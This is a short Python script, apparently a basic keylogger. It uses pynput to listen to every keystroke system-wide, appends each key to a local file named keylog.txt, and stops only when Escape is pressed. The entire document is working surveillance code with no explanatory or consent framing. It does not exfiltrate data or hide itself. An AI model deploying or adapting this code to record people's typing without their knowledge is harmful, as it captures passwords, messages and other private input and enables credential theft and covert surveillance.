from pynput import keyboard

# File to store keystrokes
log_file = "keylog.txt"


def on_press(key):
    try:
        # Convert the key to a string and write it to the file
        with open(log_file, "a") as f:
            f.write(f"{key.char}\n")
    except AttributeError:
        # Handle special keys like shift, ctrl, etc.
        with open(log_file, "a") as f:
            f.write(f"{key}\n")


def on_release(key):
    # Stop the listener when the escape key is pressed
    if key == keyboard.Key.esc:
        return False


# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
